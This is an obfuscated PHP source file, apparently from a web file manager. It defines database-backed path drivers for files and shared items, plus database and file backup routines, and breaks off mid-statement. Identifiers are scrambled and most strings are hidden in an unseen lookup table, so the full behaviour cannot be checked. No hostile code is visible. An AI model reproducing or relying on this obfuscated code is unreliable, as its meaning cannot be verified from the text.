<?php
 goto B‹‹¡—İŠ’; dÚäÍ¿—: class PathDriverDB extends PathDriverBase { public $model; public $pathParse; public function __construct($±©ê¬×) { $this->pathParse = $±©ê¬×; $this->model = Model($_SERVER[„Ç©ñÎ©][1326]); } public function getPath($Úî¿¸—™) { return trim($Úî¿¸—™, $_SERVER[„Ç©ñÎ©][8]); } public function pathFather($¶´É…Å¦) { $ë¬ñİ = $this->parse($¶´É…Å¦); $ë¬ñİ = $this->infoSimple($¶´É…Å¦); return $ë¬ñİ ? $ë¬ñİ[$_SERVER[„Ç©ñÎ©][441]] : !1; } public function pathThis($‰ÍÚÃò¹) { $îëĞ”„Ÿ = $this->infoSimple($‰ÍÚÃò¹); return $îëĞ”„Ÿ ? $îëĞ”„Ÿ[$_SERVER[„Ç©ñÎ©][32]] : !1; } public function getPathOuter($ ü¯·Õ†) { if (!$ ü¯·Õ†) { return $ ü¯·Õ†; } $á–ºíŸÊ = $this->parse($ ü¯·Õ†); return KodIO::make($á–ºíŸÊ[$_SERVER[„Ç©ñÎ©][408]]); } public function copyFolderFromIO($Ø÷Ššèİ, $·¦¯óâæ, $èÎÕ„æ•, $ŞÜ—´Ïæ, $Îµ‚ÅÃ’) { $šåòôúò = $this->model->copyFolderFromIO($Ø÷Ššèİ, $·¦¯óâæ, $èÎÕ„æ•, $ŞÜ—´Ïæ, $Îµ‚ÅÃ’); return KodIO::make($šåòôúò); } public function isParentOf($¬­¯Å½, $… €’©) { return $this->model->isParentOf($¬­¯Å½, $… €’©); } public function mkfile($¥ø‹É»İ, $Åõîä“Ú = '', $É÷êßûÅ = REPEAT_RENAME) { $œ”®Ã‘ =& $_SERVER[„Ç©ñÎ©]; $°óÔåâ´ = $this->parse($¥ø‹É»İ); $¥ø‹É»İ = $°óÔåâ´[$œ”®Ã‘[408]]; for ($ˆ®â”Õ¿ = 0; $ˆ®â”Õ¿ < count($°óÔåâ´[$œ”®Ã‘[1327]]); $ˆ®â”Õ¿++) { $¦ÂßœÄ = $°óÔåâ´[$œ”®Ã‘[1327]][$ˆ®â”Õ¿]; if ($ˆ®â”Õ¿ == count($°óÔåâ´[$œ”®Ã‘[1327]]) - 1) { $¥ø‹É»İ = $this->model->mkfile($¥ø‹É»İ, $¦ÂßœÄ, $Åõîä“Ú, $É÷êßûÅ); break; } $¥ø‹É»İ = $this->model->mkdir($¥ø‹É»İ, $¦ÂßœÄ, REPEAT_SKIP); } return $this->getPathOuter($¥ø‹É»İ); } public function mkdir($Äœ¡¿à³, $¾±Ü¨Äü = REPEAT_SKIP) { $–Ÿâæ© =& $_SERVER[„Ç©ñÎ©]; $Âá™ºå‚ = $this->parse($Äœ¡¿à³); $Äœ¡¿à³ = $Âá™ºå‚[$–Ÿâæ©[408]]; for ($Ìğì·’¿ = 0; $Ìğì·’¿ < count($Âá™ºå‚[$–Ÿâæ©[1327]]); $Ìğì·’¿++) { $Š¦üàÙ = $Âá™ºå‚[$–Ÿâæ©[1327]][$Ìğì·’¿]; $Äœ¡¿à³ = $this->model->mkdir($Äœ¡¿à³, $Š¦üàÙ, $¾±Ü¨Äü); } return $this->getPathOuter($Äœ¡¿à³); } public function copyFile($òéã·°î, $’®Êë›«, $†Æı‘™… = REPEAT_REPLACE) { $ÎÍîîœ =& $_SERVER[„Ç©ñÎ©]; $ì×öÄ·× = $this->parse($’®Êë›«); $ÀÅ¢Æşã = $this->model->copy($òéã·°î, $ì×öÄ·×[$ÎÍîîœ[408]], $†Æı‘™…, $ì×öÄ·×[$ÎÍîîœ[94]]); return $ÀÅ¢Æşã ? $this->getPathOuter($ÀÅ¢Æşã) : !1; } public function moveFile($’ÒàÌ±», $€óÙĞÜ­, $‰ï–Ö¬ò = REPEAT_REPLACE) { $ˆÔ£úÌÇ =& $_SERVER[„Ç©ñÎ©]; $’áÆÀ¦Õ = $this->parse($€óÙĞÜ­); $³óó²õ‚ = $this->model->move($’ÒàÌ±», $’áÆÀ¦Õ[$ˆÔ£úÌÇ[408]], $‰ï–Ö¬ò, $’áÆÀ¦Õ[$ˆÔ£úÌÇ[94]]); return $³óó²õ‚ ? $this->getPathOuter($³óó²õ‚) : !1; } public function copy($®´èÎá•, $”’Ê‹, $­ˆòëš´ = REPEAT_REPLACE, $Ô¹ùò’ê = false) { $†˜‡¾óı = $this->parse($”’Ê‹); $œÏÊÌç = $this->model->copy($®´èÎá•, $†˜‡¾óı[$_SERVER[„Ç©ñÎ©][408]], $­ˆòëš´, $Ô¹ùò’ê); return $œÏÊÌç ? $this->getPathOuter($œÏÊÌç) : !1; } public function moveSameAllow() { } public function move($¼ñğ¼ñœ, $¸ ¥ğê, $ÏŠéÄŒ½ = REPEAT_REPLACE, $¡Ô‹ö¸‘ = false) { $¦‚‰àÓ = $this->parse($¸ ¥ğê); $ô†úÀ”Ñ = $this->model->move($¼ñğ¼ñœ, $¦‚‰àÓ[$_SERVER[„Ç©ñÎ©][408]], $ÏŠéÄŒ½, $¡Ô‹ö¸‘); return $ô†úÀ”Ñ ? $this->getPathOuter($ô†úÀ”Ñ) : !1; } public function remove($şö¥¹¬Û, $ŸÙîáé­ = true) { return $this->model->remove($şö¥¹¬Û, $ŸÙîáé­); } public function rename($Ìğ¾ ®Â, $¥µŞš) { $©ğ§¾¼ = $this->model->rename($Ìğ¾ ®Â, $¥µŞš); return $©ğ§¾¼ ? $this->getPathOuter($Ìğ¾ ®Â) : $©ğ§¾¼; } public function size($ô½„ú‡µ) { $®‹Éùşí = $this->infoSimple($ô½„ú‡µ); return $®‹Éùşí ? $®‹Éùşí[$_SERVER[„Ç©ñÎ©][86]] : 0; } public function infoSimple($¤Ó¢Ş«…) { return $this->model->sourceInfo($¤Ó¢Ş«…); } public function info($Ì­–ÜŠ) { return $this->infoParse($Ì­–ÜŠ); } public function infoAuth($ğµ¡Çëà) { return $this->infoParse($ğµ¡Çëà, !1, !0); } public function infoWithChildren($…ÕŠ¡•˜) { return $this->infoParse($…ÕŠ¡•˜, !0); } protected function infoParse($“«À˜È, $Ú—¨‚É = false, $âé¯†¡ğ = false) { if (!$Ú—¨‚É) { return $this->model->pathInfo($“«À˜È, $âé¯†¡ğ); } return $this->model->pathInfoMore($“«À˜È); } public function infoFull($´Ø©Ùè•) { $İû“Îáô =& $_SERVER[„Ç©ñÎ©]; $îüó¡ì = explode($İû“Îáô[8], $´Ø©Ùè•); $ˆÙ÷¡ó† = implode($İû“Îáô[8], array_splice($îüó¡ì, 1)); return $this->model->pathInfoByPath($îüó¡ì[0], $ˆÙ÷¡ó†); } public function hashSimple($’ô²¹ôÊ) { $ í½¹•Û =& $_SERVER[„Ç©ñÎ©]; $Ô¹ûˆ€ = $this->infoWithChildren($’ô²¹ôÊ); return $Ô¹ûˆ€[$ í½¹•Û[180]][$ í½¹•Û[187]]; } public function hashMd5($­‘õ×áñ) { $È‘¥®šÅ =& $_SERVER[„Ç©ñÎ©]; $³Ë‡ãÄª = $this->infoWithChildren($­‘õ×áñ); return $³Ë‡ãÄª[$È‘¥®šÅ[180]][$È‘¥®šÅ[186]]; } public function exist($Ú˜‡´ïÉ) { $¥ŸŞşÆ² =& $_SERVER[„Ç©ñÎ©]; $†ÓÉ‹õ¡ = $this->parse($Ú˜‡´ïÉ); if (!$†ÓÉ‹õ¡[$¥ŸŞşÆ²[94]]) { return $this->isFile($Ú˜‡´ïÉ) || $this->isFolder($Ú˜‡´ïÉ); } $É˜ë¬¬Â = array($¥ŸŞşÆ²[410] => $†ÓÉ‹õ¡[$¥ŸŞşÆ²[408]], $¥ŸŞşÆ²[32] => $†ÓÉ‹õ¡[$¥ŸŞşÆ²[94]]); $šÁíöµ‘ = $this->model->where($É˜ë¬¬Â)->find(); return $šÁíöµ‘ ? !0 : !1; } public function isFile($·ùŠŒ“) { $‡ÙÑ½Ü =& $_SERVER[„Ç©ñÎ©]; $™“—šŸó = $this->infoSimple($·ùŠŒ“); return $™“—šŸó && $™“—šŸó[$‡ÙÑ½Ü[419]] == $‡ÙÑ½Ü[98] ? !1 : !0; } public function isFolder($ÄôÎ¤ñÁ) { $Û¡ñË…Ø =& $_SERVER[„Ç©ñÎ©]; $«àğ½åø = $this->infoSimple($ÄôÎ¤ñÁ); return $«àğ½åø && $«àğ½åø[$Û¡ñË…Ø[419]] == $Û¡ñË…Ø[98] ? !0 : !1; } public function listPath($Ã×›ş¶™, $ÄÍÌÍïŞ = false) { $• µÊÂ‡ =& $_SERVER[„Ç©ñÎ©]; if ($Ã×›ş¶™ == $• µÊÂ‡[12]) { return !1; } $ıæÎì¤Ù = array($• µÊÂ‡[410] => $Ã×›ş¶™); if ($ÄÍÌÍïŞ) { return $this->model->listSource($ıæÎì¤Ù, -1); } return $this->model->listSource($ıæÎì¤Ù); } public function has($ıÛõº˜Ê, $¿ß‰ŒƒØ = false, $µ½†¤ú = null) { $‚«†î¿ =& $_SERVER[„Ç©ñÎ©]; $™›æºò± = $this->infoWithChildren($ıÛõº˜Ê); if ($¿ß‰ŒƒØ) { return array($‚«†î¿[218] => $™›æºò±[$‚«†î¿[218]], $‚«†î¿[217] => $™›æºò±[$‚«†î¿[217]]); } return $µ½†¤ú ? $™›æºò±[$‚«†î¿[218]] : $™›æºò±[$‚«†î¿[217]]; } public function listAll($ºÃ‚ñîİ) { $©ºÌÙæ = IO::info($this->pathParse[$_SERVER[„Ç©ñÎ©][94]]); if (!$©ºÌÙæ) { return array(); } return $this->model->listAll($ºÃ‚ñîİ); } public function getContent($›àßØîŠ) { return $this->model->getContent($›àßØîŠ); } public function setContent($Çæ¬§—º, $æÛÔÍòã = '') { return $this->model->setContent($Çæ¬§—º, $æÛÔÍòã); } public function fileSubstr($³Ñ¬šÏ, $ë° é•ó, $ÄÑîÏÌ) { return $this->model->fileSubstr($³Ñ¬šÏ, $ë° é•ó, $ÄÑîÏÌ); } public function download($üëµºë¹, $é„Ê½¢ = '') { $Õ¯»Û‘² = get_path_father($é„Ê½¢); $–‚ƒ‘ã• = get_path_this($é„Ê½¢); $º®‰·´Æ = $this->model->fileInfoGet($üëµºë¹); $ÃèÜĞÚÑ = IO::copy($º®‰·´Æ[$_SERVER[„Ç©ñÎ©][94]], $Õ¯»Û‘², !1, $–‚ƒ‘ã•); return $ÃèÜĞÚÑ; } public function setModifyTime($ìÁ‰ıËí, $—Õ˜¸ŸÍ = '') { $¥ÖÔÙ”Í =& $_SERVER[„Ç©ñÎ©]; if (!$ìÁ‰ıËí) { return; } $this->model->where(array($¥ÖÔÙ”Í[426] => $ìÁ‰ıËí))->save(array($¥ÖÔÙ”Í[95] => $—Õ˜¸ŸÍ)); } public function upload($ü¸ìÜŠ—, $•Óçø”„, $Á±Ó·éù = false, $ª‰´èê = REPEAT_REPLACE) { $ï¾ûÓ® =& $_SERVER[„Ç©ñÎ©]; $œôÎÔ¸Ì = $this->parse($ü¸ìÜŠ—); $õ…â±Ö = $this->model->addFile($œôÎÔ¸Ì[$ï¾ûÓ®[408]], $•Óçø”„, $œôÎÔ¸Ì[$ï¾ûÓ®[94]], $Á±Ó·éù, $ª‰´èê); return $this->getPathOuter($õ…â±Ö); } public function uploadFileByID($²ö–ó‰Ú, $øÆ“ù, $‚óŠáº¿) { $åƒÆù¥† =& $_SERVER[„Ç©ñÎ©]; $¤ ¨Äô¶ = $this->parse($²ö–ó‰Ú); $Ü€•Æ²è = $this->model->addFileByFileID($¤ ¨Äô¶[$åƒÆù¥†[408]], $øÆ“ù, $¤ ¨Äô¶[$åƒÆù¥†[94]], $‚óŠáº¿); return $this->getPathOuter($Ü€•Æ²è); } public function addFileByRemote($‚ıÈ¸ûÂ, $•à¬–²¤, $Ò×Ÿ–… = array(), $¤¬™èá¯ = '', $Ä‡¸¶) { $ñ‘îíøó =& $_SERVER[„Ç©ñÎ©]; $õïŒæÃŠ = $this->parse($‚ıÈ¸ûÂ); $¤¬™èá¯ = empty($¤¬™èá¯) ? $õïŒæÃŠ[$ñ‘îíøó[94]] : $¤¬™èá¯; $‚î‚ßèÃ = $this->model->addFileByRemote($õïŒæÃŠ[$ñ‘îíøó[408]], $•à¬–²¤, $¤¬™èá¯, $Ò×Ÿ–…, $Ä‡¸¶); return $this->getPathOuter($‚î‚ßèÃ); } public function uploadLink($ä¢¡“ìÓ, $å¨Ğ¤ = 0) { $ƒÕÖ¿‘õ =& $_SERVER[„Ç©ñÎ©]; $¯øÅë‰ = $this->parse($ä¢¡“ìÓ); $†œÀş’ç = _get($GLOBALS[$ƒÕÖ¿‘õ[7]], $ƒÕÖ¿‘õ[1328]); $Ö—·Î¯ = _get($GLOBALS[$ƒÕÖ¿‘õ[7]], $ƒÕÖ¿‘õ[1329]); $ä¢¡“ìÓ = Model($ƒÕÖ¿‘õ[618])->createFileName($¯øÅë‰[$ƒÕÖ¿‘õ[94]], $†œÀş’ç, $Ö—·Î¯); return IO::uploadLink($ä¢¡“ìÓ, $å¨Ğ¤); } public function fileNameAuto($ìØÙ®¨­, $‡Öéö…›, $Öïµœî© = REPEAT_REPLACE, $âŞ— òÑ = false) { return $this->model->fileNameAuto($ìØÙ®¨­, $‡Öéö…›, $Öïµœî©, $âŞ— òÑ); } public function fileNameExist($ª‰‡úı, $ÖŠ±€) { return $this->model->fileNameExist($ª‰‡úı, $ÖŠ±€); } protected function _fileOut($š„Û»‰, $ÄûÅÙõ‡ = false, $ú´÷³¼ = false, $¥‡•ì®û = '', $÷âÈ‚“ë = false) { $Ù÷Ìü÷à =& $_SERVER[„Ç©ñÎ©]; $íœ¯‘¾ = $this->model->sourceInfo($š„Û»‰); if ($íœ¯‘¾[$Ù÷Ìü÷à[419]] == $Ù÷Ìü÷à[98]) { header($Ù÷Ìü÷à[1330]); die; } $»Éë€İÕ = $this->model->fileInfoGet($š„Û»‰); $¥‡•ì®û = $»Éë€İÕ[$Ù÷Ìü÷à[186]] ? $»Éë€İÕ[$Ù÷Ìü÷à[186]] : $¥‡•ì®û; $Âõçå‚§ = isset($GLOBALS[$Ù÷Ìü÷à[1331]]) ? $GLOBALS[$Ù÷Ìü÷à[1331]] : $íœ¯‘¾[$Ù÷Ìü÷à[32]]; if ($÷âÈ‚“ë) { return IO::fileOutServer($»Éë€İÕ[$Ù÷Ìü÷à[94]], $ÄûÅÙõ‡, $Âõçå‚§, $¥‡•ì®û); } IO::fileOut($»Éë€İÕ[$Ù÷Ìü÷à[94]], $ÄûÅÙõ‡, $Âõçå‚§, $¥‡•ì®û); } public function fileOut($ÓØæğÌÛ, $¿ş¶Î—× = false, $ı½Èªïª = false, $«Á„Ô”› = '') { $this->_fileOut($ÓØæğÌÛ, $¿ş¶Î—×, $ı½Èªïª, $«Á„Ô”›); } public function fileOutServer($âá©ˆ…›, $‡Ã‹Çú‹ = false, $å”çÃµ¢ = false, $‘¥Í—Ë¬ = '') { $this->_fileOut($âá©ˆ…›, $‡Ã‹Çú‹, $å”çÃµ¢, $‘¥Í—Ë¬, !0); } protected function _fileOutImage($…·êùèË, $ÒÊÅ¾ = 250) { $Å÷·ïüò =& $_SERVER[„Ç©ñÎ©]; $’îëİ… = $this->model->pathInfo($…·êùèË); if ($’îëİ…[$Å÷·ïüò[419]] == $Å÷·ïüò[98]) { show_json($Å÷·ïüò[1332] . $…·êùèË, !1); } $ÅıÀì™ = $this->model->fileInfoGet($…·êùèË); $ÅıÀì™[$Å÷·ïüò[32]] = $’îëİ…[$Å÷·ïüò[32]]; $ÅıÀì™[$Å÷·ïüò[179]] = $’îëİ…[$Å÷·ïüò[179]]; $GLOBALS[$Å÷·ïüò[1331]] = $ÅıÀì™[$Å÷·ïüò[32]]; $GLOBALS[$Å÷·ïüò[178]] = $ÅıÀì™; IO::fileOutImage($ÅıÀì™[$Å÷·ïüò[94]], $ÒÊÅ¾); } public function fileOutImage($¿„Ú›È, $îÁ¡ÆÑÕ = 250) { $this->_fileOutImage($¿„Ú›È, $îÁ¡ÆÑÕ); } public function fileOutImageServer($“Ùœø©, $­ëöä¯Í = 250) { $this->_fileOutImage($“Ùœø©, $­ëöä¯Í); } public function link($¼‰ì çä, $İ¢Ğõúñ = '') { $©½øÉª = $this->model->fileInfoGet($¼‰ì çä); return IO::link($©½øÉª[$_SERVER[„Ç©ñÎ©][94]], $İ¢Ğõúñ); } protected function parse($‡‡À¥ş®) { $Ë¨¹Ä‡³ =& $_SERVER[„Ç©ñÎ©]; if (strstr($‡‡À¥ş®, $Ë¨¹Ä‡³[8]) === !1) { return array($Ë¨¹Ä‡³[428] => intval($‡‡À¥ş®), $Ë¨¹Ä‡³[94] => $Ë¨¹Ä‡³[12], $Ë¨¹Ä‡³[1327] => array()); } $Ş½Øâò = explode($Ë¨¹Ä‡³[8], trim($‡‡À¥ş®, $Ë¨¹Ä‡³[8])); if (count($Ş½Øâò) < 2) { show_tips(clear_html($‡‡À¥ş®) . $Ë¨¹Ä‡³[1333]); } return array($Ë¨¹Ä‡³[428] => intval($Ş½Øâò[0]), $Ë¨¹Ä‡³[94] => $Ş½Øâò[1], $Ë¨¹Ä‡³[1327] => array_slice($Ş½Øâò, 1)); } } class PathDriverDbShareItem extends PathDriverDB { public function __construct($¾­ïá´©) { $this->pathParse = $¾­ïá´©; $this->model = Model($_SERVER[„Ç©ñÎ©][1326]); } public function getPathOuter($Öı™›•”) { $ÒÖ˜€±’ =& $_SERVER[„Ç©ñÎ©]; if (!$Öı™›•”) { return $Öı™›•”; } $ßòêÒæÚ = $this->parse($Öı™›•”); return trim(KodIO::makeShare($this->pathParse[$ÒÖ˜€±’[408]], $ßòêÒæÚ[$ÒÖ˜€±’[408]]), $ÒÖ˜€±’[8]); } protected function infoParse($Å€“»®¿, $¤ß—æÅ = false, $‘®Ş¼´† = false) { $·áÀ‘® =& $_SERVER[„Ç©ñÎ©]; $í˜¾ø¼È = $this->pathParse[$·áÀ‘®[408]]; $çåÂƒòµ = trim($this->pathParse[$·áÀ‘®[1168]], $·áÀ‘®[8]); return Action($·áÀ‘®[1334])->sharePathInfo($í˜¾ø¼È, $çåÂƒòµ, $¤ß—æÅ); } public function infoFull($øô»Ëâ) { $Îª„Êã =& $_SERVER[„Ç©ñÎ©]; $Ä®Áìñ¬ = explode($Îª„Êã[8], trim($øô»Ëâ, $Îª„Êã[8])); if (count($Ä®Áìñ¬) > 1) { $±Ñ¢Èíş = implode($Îª„Êã[8], array_splice($Ä®Áìñ¬, 1)); $ÂÚİÉ×£ = $this->model->pathInfoByPath($Ä®Áìñ¬[0], $±Ñ¢Èíş); if (!$ÂÚİÉ×£) { return !1; } $this->pathParse[$Îª„Êã[1168]] = $ÂÚİÉ×£[$Îª„Êã[411]]; } return $this->infoParse($øô»Ëâ); } public function listAll($¦ğ¬Â¶Ş) { $ëûì¿ÚÑ =& $_SERVER[„Ç©ñÎ©]; $˜Æ¬µÑÃ = IO::info($this->pathParse[$ëûì¿ÚÑ[94]]); if (!$˜Æ¬µÑÃ) { return array(); } $é­…ñãÔ = $this->model->listAll($¦ğ¬Â¶Ş); $Á¦‹‹¡Á = Model($ëûì¿ÚÑ[610])->getInfo($˜Æ¬µÑÃ[$ëûì¿ÚÑ[498]]); $îûõ™Ü = Action($ëûì¿ÚÑ[1334]); foreach ($é­…ñãÔ as &$Ï®Ì‘ü¨) { check_abort(); $Ï®Ì‘ü¨[$ëûì¿ÚÑ[96]] = $îûõ™Ü->_shareItemeParse($Ï®Ì‘ü¨[$ëûì¿ÚÑ[96]], $Á¦‹‹¡Á); } unset($Ï®Ì‘ü¨); return $é­…ñãÔ; } } class PathDriverDbShareLink extends PathDriverDB { public function __construct($áå÷±—˜) { $this->pathParse = $áå÷±—˜; $this->model = Model($_SERVER[„Ç©ñÎ©][1326]); } protected function infoParse($œŞ´ó¸ù, $´û·ü£¬ = false, $å±øºüİ = false) { $Ñááàûä =& $_SERVER[„Ç©ñÎ©]; return Action($Ñááàûä[1174])->sharePathInfo($this->pathParse[$Ñááàûä[94]], !0, $´û·ü£¬); } public function listPath($”¡ÛÀÂŸ, $İÕ­Ó¹… = false) { $Ôó¹š¼Š =& $_SERVER[„Ç©ñÎ©]; $Úí…Èâ¿ = parent::listPath($”¡ÛÀÂŸ, $İÕ­Ó¹…); if (!$Úí…Èâ¿) { return $Úí…Èâ¿; } if (is_array($Úí…Èâ¿[$Ôó¹š¼Š[1335]])) { $Úí…Èâ¿[$Ôó¹š¼Š[1335]] = Action($Ôó¹š¼Š[1174])->shareItemInfo($Úí…Èâ¿[$Ôó¹š¼Š[1335]]); } foreach ($Úí…Èâ¿ as $œØŸ¸Œ => $öÒğº¶) { if (!in_array($œØŸ¸Œ, array($Ôó¹š¼Š[93], $Ôó¹š¼Š[92]))) { continue; } foreach ($öÒğº¶ as $ñÍÌŞ­— => $È»ö¾ƒú) { $Úí…Èâ¿[$œØŸ¸Œ][$ñÍÌŞ­—] = Action($Ôó¹š¼Š[1174])->shareItemInfo($È»ö¾ƒú); } } return $Úí…Èâ¿; } public function listAll($ŒëşÁ¸±) { $ŸÖÉ¥ú¦ =& $_SERVER[„Ç©ñÎ©]; $ˆ±æôŞÃ = IO::info($this->pathParse[$ŸÖÉ¥ú¦[94]]); if (!$ˆ±æôŞÃ) { return array(); } $›‚Œ¶ÏÇ = $this->model->listAll($ŒëşÁ¸±); foreach ($›‚Œ¶ÏÇ as &$¼«°ÇÒì) { $¼«°ÇÒì[$ŸÖÉ¥ú¦[96]] = Action($ŸÖÉ¥ú¦[1174])->shareItemInfo($¼«°ÇÒì[$ŸÖÉ¥ú¦[96]]); } unset($¼«°ÇÒì); return $›‚Œ¶ÏÇ; } } goto C˜Ã‚¸ğ; aÍ¤ãÒ: class BackupDbFile { public function __construct() { } public function index() { $ÍÅÃ²â¿ =& $_SERVER[„Ç©ñÎ©]; $Îœê¤íÁ = Backup::get(); $Í—‚²Œı = $Îœê¤íÁ[$ÍÅÃ²â¿[32]]; $¼°àüĞ¼ = $this->tmpFilesPath() . "\x62\x61\x63\153\x75\160\x5f{$Í—‚²Œı}\57"; $¢ü§óš„ = $this->backupPath($Îœê¤íÁ); if (!($¢ü§óš„ = IO::mkdir($¢ü§óš„))) { return !1; } $òÑ³ú˜ = IO::listPath($¼°àüĞ¼); $ú‡ÍÅ€ú = isset($òÑ³ú˜[$ÍÅÃ²â¿[93]]) ? $òÑ³ú˜[$ÍÅÃ²â¿[93]] : array(); $Ë„ÜÂ‡’ = array_sum(array_column($ú‡ÍÅ€ú, $ÍÅÃ²â¿[86])); if (!$Ë„ÜÂ‡’) { return !1; } $¶Á„“·Ÿ = array($ÍÅÃ²â¿[801] => $Ë„ÜÂ‡’, $ÍÅÃ²â¿[802] => time()); Backup::set($¶Á„“·Ÿ); $›¥çº¡ = new TaskFileTransfer($ÍÅÃ²â¿[803], $ÍÅÃ²â¿[783], count($ú‡ÍÅ€ú), LNG($ÍÅÃ²â¿[784]) . $ÍÅÃ²â¿[395] . LNG($ÍÅÃ²â¿[786]) . $ÍÅÃ²â¿[804]); $›¥çº¡->task[$ÍÅÃ²â¿[766]] = $Ë„ÜÂ‡’; foreach ($òÑ³ú˜[$ÍÅÃ²â¿[93]] as $éš”›ƒ) { $³«Ù—ø· = IO::move($éš”›ƒ[$ÍÅÃ²â¿[94]], $¢ü§óš„); if (!$³«Ù—ø·) { $›¥çº¡->end(); $ æ²ŞÇ = IO::getLastError($ÍÅÃ²â¿[805] . $éš”›ƒ[$ÍÅÃ²â¿[94]] . $ÍÅÃ²â¿[806] . $¢ü§óš„ . $ÍÅÃ²â¿[174]); write_log($ æ²ŞÇ, $ÍÅÃ²â¿[783]); return !1; } } $òË«¯‘œ = new DbManage(); $Éûö¼ù = $òË«¯‘œ->getSqlFile(); if (!$Éûö¼ù[$ÍÅÃ²â¿[807]] || !$Éûö¼ù[$ÍÅÃ²â¿[13]]) { return !1; } IO::move($Éûö¼ù[$ÍÅÃ²â¿[807]], $¢ü§óš„); IO::move($Éûö¼ù[$ÍÅÃ²â¿[13]], $¢ü§óš„); $›¥çº¡->end(); $¶Á„“·Ÿ = array($ÍÅÃ²â¿[808] => $Ë„ÜÂ‡’, $ÍÅÃ²â¿[809] => time()); Backup::set($¶Á„“·Ÿ); return !0; } private function backupPath($¶”ÔÔ™û) { $ª›™ê—é =& $_SERVER[„Ç©ñÎ©]; $Òí½ñÅö = $¶”ÔÔ™û[$ª›™ê—é[32]]; $ğ¦Ò¤Ü‘ = Model($ª›™ê—é[773])->get($ª›™ê—é[774]); $âÃà æß = substr(md5($ª›™ê—é[775] . $ğ¦Ò¤Ü‘ . $Òí½ñÅö), 0, 8); return "\173\x69\157\72{$¶”ÔÔ™û[$ª›™ê—é[755]]}\175\57\144\141\x74\x61\142\x61\163\145\57\x62\x61\x63\x6b\165\x70\x2f" . $Òí½ñÅö . $ª›™ê—é[11] . $âÃà æß; } private function tmpFilesPath() { $“ª“îæû =& $_SERVER[„Ç©ñÎ©]; $€«úîÔÊ = TEMP_FILES; if ($GLOBALS[$“ª“îæû[6]][$“ª“îæû[99]][$“ª“îæû[799]]) { $€«úîÔÊ = $GLOBALS[$“ª“îæû[6]][$“ª“îæû[99]][$“ª“îæû[799]]; if (!mk_dir($€«úîÔÊ) || !is_writable($€«úîÔÊ) || !IO::mkfile($€«úîÔÊ . $“ª“îæû[800])) { $€«úîÔÊ = TEMP_FILES; } } return $€«úîÔÊ; } } class BackupFile { public function __construct() { } public function index() { $æõ×üğŸ = Backup::get(); $Ş³™¢ïª = $æõ×üğŸ[$_SERVER[„Ç©ñÎ©][302]][$_SERVER[„Ç©ñÎ©][209]][$_SERVER[„Ç©ñÎ©][477]]; $®şˆÄ¡ı = array($_SERVER[„Ç©ñÎ©][478] => array($_SERVER[„Ç©ñÎ©][810], $Ş³™¢ïª), $_SERVER[„Ç©ñÎ©][811] => array($_SERVER[„Ç©ñÎ©][340], $æõ×üğŸ[$_SERVER[„Ç©ñÎ©][755]])); $Íøäİ·¥ = (int) Model($_SERVER[„Ç©ñÎ©][792])->where($®şˆÄ¡ı)->count($_SERVER[„Ç©ñÎ©][477]); $ÍŸáÓ = (int) Model($_SERVER[„Ç©ñÎ©][792])->where($®şˆÄ¡ı)->sum($_SERVER[„Ç©ñÎ©][86]); $Ë¾‡ÕÎ¸ = new TaskFileTransfer($_SERVER[„Ç©ñÎ©][812], $_SERVER[„Ç©ñÎ©][783], $Íøäİ·¥, LNG($_SERVER[„Ç©ñÎ©][784]) . $_SERVER[„Ç©ñÎ©][785] . LNG($_SERVER[„Ç©ñÎ©][813])); $Ë¾‡ÕÎ¸->task[$_SERVER[„Ç©ñÎ©][766]] = $ÍŸáÓ; $›•ÆÀØî = array($_SERVER[„Ç©ñÎ©][814] => $Íøäİ·¥, $_SERVER[„Ç©ñÎ©][815] => $ÍŸáÓ, $_SERVER[„Ç©ñÎ©][816] => time()); Backup::set($›•ÆÀØî); $Âí…í‰³ = !0; $Ó·É¥æ‡ = $this->storeIds(); $©Éµ¡¶Š = 1; $õÒß¨Ë = 1000; $Šï¶‡¹æ = $¶óàŞÖ’ = 0; $ºÅùãåø = array(); $ù˜öº¥ = $é“Ô¤ÎÌ = 0; do { $¸ş÷†ê™ = $_SERVER[„Ç©ñÎ©][817]; $©›Šãßñ = Model($_SERVER[„Ç©ñÎ©][792])->where($®şˆÄ¡ı)->field($¸ş÷†ê™)->order($_SERVER[„Ç©ñÎ©][818])->selectPage($õÒß¨Ë, $©Éµ¡¶Š); $ã¤¨ë• = !empty($©›Šãßñ[$_SERVER[„Ç©ñÎ©][378]]) ? $©›Šãßñ[$_SERVER[„Ç©ñÎ©][378]] : array(); foreach ($ã¤¨ë• as $â°‹úŒ) { if (!$this->_fileExist($â°‹úŒ, $ºÅùãåø, $Ó·É¥æ‡)) { $Íøäİ·¥ -= 1; $ÍŸáÓ -= (int) $â°‹úŒ[$_SERVER[„Ç©ñÎ©][86]]; write_log("\x66\x69\x6c\x65\x20\156\x6f\164\x20\145\170\151\x73\x74\x2e\146\151\154\145\x49\x44\x3a{$â°‹úŒ[$_SERVER[„Ç©ñÎ©][477]]}\x2c\x20\x70\141\164\x68\x3a{$â°‹úŒ[$_SERVER[„Ç©ñÎ©][94]]}", $_SERVER[„Ç©ñÎ©][819]); continue; } $Œ’£éâ = $â°‹úŒ[$_SERVER[„Ç©ñÎ©][94]]; $é—îÅ¨ = "\173\x69\157\x3a{$æõ×üğŸ[$_SERVER[„Ç©ñÎ©][755]]}\175" . substr($Œ’£éâ, strlen("\x7b\x69\157\72{$â°‹úŒ[$_SERVER[„Ç©ñÎ©][820]]}\175")); if (IO::exist($é—îÅ¨)) { $Ë¾‡ÕÎ¸->updateFileEnd($â°‹úŒ[$_SERVER[„Ç©ñÎ©][32]], $â°‹úŒ[$_SERVER[„Ç©ñÎ©][86]]); } else { $é—îÅ¨ = get_path_father($é—îÅ¨); IO::mkdir($é—îÅ¨); if (!IO::copy($Œ’£éâ, $é—îÅ¨, $_SERVER[„Ç©ñÎ©][821])) { write_log($_SERVER[„Ç©ñÎ©][822] . $Œ’£éâ . $_SERVER[„Ç©ñÎ©][806] . $é—îÅ¨ . $_SERVER[„Ç©ñÎ©][174], $_SERVER[„Ç©ñÎ©][783]); $Âí…í‰³ = !1; break; } } $Ş³™¢ïª = $â°‹úŒ[$_SERVER[„Ç©ñÎ©][477]]; $¶óàŞÖ’ += 1; $Šï¶‡¹æ += $â°‹úŒ[$_SERVER[„Ç©ñÎ©][86]]; $é“Ô¤ÎÌ += 1; $ù˜öº¥ += $â°‹úŒ[$_SERVER[„Ç©ñÎ©][86]]; if ($Šï¶‡¹æ >= 1024 * 1024 * 100) { $›•ÆÀØî = array($_SERVER[„Ç©ñÎ©][823] => $Ş³™¢ïª, $_SERVER[„Ç©ñÎ©][824] => 